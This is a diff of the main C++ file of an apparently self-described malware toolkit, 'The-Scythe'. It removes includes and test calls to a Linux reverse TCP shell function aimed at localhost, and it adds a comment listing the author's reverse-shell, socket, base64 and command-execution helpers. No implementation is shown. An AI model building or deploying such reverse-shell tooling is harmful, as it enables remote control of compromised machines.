@@ -3,32 +3,40 @@
 //
 #include "modules/The-Scythe.hpp"
 #include "modules/core/networking/tcp_client.hpp"
-#include "modules/utils/crypto/decoder.hpp"
-#include "modules/utils/crypto/encoder.hpp"
 #include "modules/core/execution/execution.hpp"
-#include "modules/malware/linux_reverse_tcp.hpp"
-//#include "modules/core/networking/http_client.hpp"
+
+
+/*
+ *  Functions i made
+ *
+ *  Linux and Windows {
+ *  TheScythe::Utils::Encoder::b64Encode(data)
+ *  TheScythe::Utils::Decoder::b64Decode(TheScythe::Utils::Encoder::b64Encode(data), decode)
+ *  TheScythe::Utils::Decoder::bin_to_ip("1111111", "0", "0", "1")
+ *  TheScythe::Core::Execution::exec(cmd)
+ *
+ *  }
+ *
+ *  Linux {
+ *  TheScythe::Core::Socket::dnsLookup4("google.com") << std::endl;
+ *  TheScythe::Core::Malware::linux_reverse_tcp6("::1", port);
+ *  TheScythe::Core::Socket::linux_tcp_connect_ipv6(ipv6, 7002, "hi")
+ *  TheScythe::Core::Malware::linux_reverse_tcp4("::1", port);
+ *  TheScythe::Core::Socket::linux_tcp_connect_ipv4(ipv6, 7002, "hi")
+ *  }
+ *
+ *
+ *
+ *
+ *
+ *
+ *
+ */
+
 
 int main()
 {
-    std::string data = "hello mf";
-    int port = 9002;
-    //TheScythe::Core::Http::http_post(url, fields);
-/*
-    std::cout << TheScythe::Core::Socket::dnsLookup4("google.com") << std::endl;
 
-    std::cout << TheScythe::Utils::Encoder::b64Encode(data) << std::endl;
-    std::string decode;
-    TheScythe::Utils::Decoder::b64Decode(TheScythe::Utils::Encoder::b64Encode(data), decode);
-    std::cout << decode;*/
-    const char *ip = TheScythe::Utils::Decoder::bin_to_ip("1111111", "0", "0", "1").c_str();
-    TheScythe::Core::Malware::linux_reverse_tcp6("::1", port);
-    //std::cout << TheScythe::Core::Socket::linux_tcp_connect_ipv4(ip, 9002, NULL);
-    //const char * cmd = "ls";
-    //std::cout << TheScythe::Core::Execution::exec(cmd) << std::endl;
-    /*const char *ipv6 = "::1";
-    std::cout << TheScythe::Core::Socket::linux_tcp_connect_ipv6(ipv6, 7002, "hi");
-*/
 
 
 
